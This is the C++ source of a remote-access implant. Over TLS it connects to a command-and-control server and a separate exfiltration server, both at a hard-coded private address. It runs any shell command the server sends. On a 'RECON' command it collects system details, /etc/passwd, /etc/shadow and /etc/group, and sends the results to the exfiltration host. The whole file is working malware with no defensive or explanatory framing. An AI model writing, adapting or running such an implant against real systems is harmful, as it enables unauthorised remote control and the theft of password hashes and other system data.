// See 

#include <cstdlib>
#include <cstddef>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <memory>
#include <array>
#include <fstream>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#ifndef C2_IP
#define C2_IP "10.37.1.249"
#endif
#ifndef C2_PORT
#define C2_PORT 8888
#endif
#ifndef EXFIL_IP
#define EXFIL_IP "10.37.1.249"
#endif
#ifndef EXFIL_PORT
#define EXFIL_PORT 8889
#endif

std::string decrypt(char* buf, size_t bytes) {
    buf[bytes] = '\0';
    std::string message(buf);
    return message;
}

std::vector<std::byte> encrypt(std::string s) {
    std::vector<std::byte> e;
    for(auto& c : s) {
        e.push_back(static_cast<std::byte>(c));
    }
    return e;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string r;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if(!pipe) { return "ERR, pipe failed"; }
    while(fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        r += buffer.data();
    }
    return r;
}

// ----------------------------------------------------------------------
// Simple file reader
// ----------------------------------------------------------------------
static std::string read_file(const std::string& path) {
    std::ifstream f(path);
    if (!f.is_open()) {
        return "[!] Could not read " + path + "\n";
    }
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

// ----------------------------------------------------------------------
// Reconnaissance collection
// ----------------------------------------------------------------------
static std::string run_recon() {
    std::ostringstream out;
    out << "=== MINIMAL RECON REPORT ===\n\n";
    
    out << "[*] System Info:\n";
    out << exec("uname -a");
    out << exec("id");
    out << exec("hostname");
    
    out << "\n[*] /etc/passwd:\n";
    out << read_file("/etc/passwd");
    
    out << "\n[*] /etc/shadow:\n";
    out << read_file("/etc/shadow");
    
    out << "\n[*] /etc/group:\n";
    out << read_file("/etc/group");
    
    out << "\n[*] /tmp directory:\n";
    out << exec("ls -la /tmp 2>/dev/null");
    
    out << "\n=== END RECON ===\n";
    return out.str();
}

// ----------------------------------------------------------------------
// Exfiltration helper
// ----------------------------------------------------------------------
static void exfiltrate(SSL* exfil_ssl, const std::string& data) {
    if (!exfil_ssl) return;
    SSL_write(exfil_ssl, data.c_str(), data.size());
}

void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
    std::istringstream iss(msg);
    std::string keyword, id, data;
    if (!(iss >> keyword) || !(iss >> id)) return;
    std::getline(iss, data);
    if (!data.empty() && data[0] == ' ') data.erase(0, 1);

    std::string response;

    if (keyword == "HELO") {
        response = "HELLO " + id;
        exfiltrate(exfil_ssl, "HELO from implant\n");
    } else if (keyword == "EXIT") {
        throw 1;
    } else if (keyword == "CMD") {
        std::string output = exec(data.c_str());
        response = output.empty() ? "CMD OK" : output;
        exfiltrate(exfil_ssl, "CMD: " + data + "\n" + output + "\n---\n");
    } else if (keyword == "RECON") {
        std::string recon_report = run_recon();
        response = "OK " + id + " " + recon_report;
        exfiltrate(exfil_ssl, "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n");
    } else {
        response = "ERR " + id;
    }

    SSL_write(c2_ssl, response.c_str(), response.size());
}

SSL_CTX* createSSLContext() {
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return nullptr;
    }
    if (SSL_CTX_load_verify_locations(ctx, "/tmp/index.html", nullptr) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return nullptr;
    }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, nullptr);
    return ctx;
}

SSL* connectTLS(SSL_CTX* ctx, int sock, const char* hostname) {
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_tlsext_host_name(ssl, hostname);
    if (SSL_connect(ssl) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return nullptr;
    }
    return ssl;
}

int makeSocket(const char* ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

int main() {
    SSL_CTX* ctx = createSSLContext();
    if (!ctx) return 1;

    int sock1 = makeSocket(C2_IP, C2_PORT);
    if (sock1 < 0) { SSL_CTX_free(ctx); return 1; }
    SSL* ssl1 = connectTLS(ctx, sock1, C2_IP);
    if (!ssl1) { close(sock1); SSL_CTX_free(ctx); return 1; }

    int sock2 = makeSocket(EXFIL_IP, EXFIL_PORT);
    if (sock2 < 0) { SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }
    SSL* ssl2 = connectTLS(ctx, sock2, EXFIL_IP);
    if (!ssl2) { close(sock2); SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }

    char buf[1024];
    while (true) {
        int bytes = SSL_read(ssl1, buf, sizeof(buf) - 1);
        if (bytes <= 0) break;
        buf[bytes] = '\0';

        try {
            handleMessage(std::string(buf), ssl1, ssl2);
        } catch (...) {
            break;
        }
    }

    SSL_shutdown(ssl1); SSL_free(ssl1); close(sock1);
    SSL_shutdown(ssl2); SSL_free(ssl2); close(sock2);
    SSL_CTX_free(ctx);
    return EXIT_SUCCESS;
}
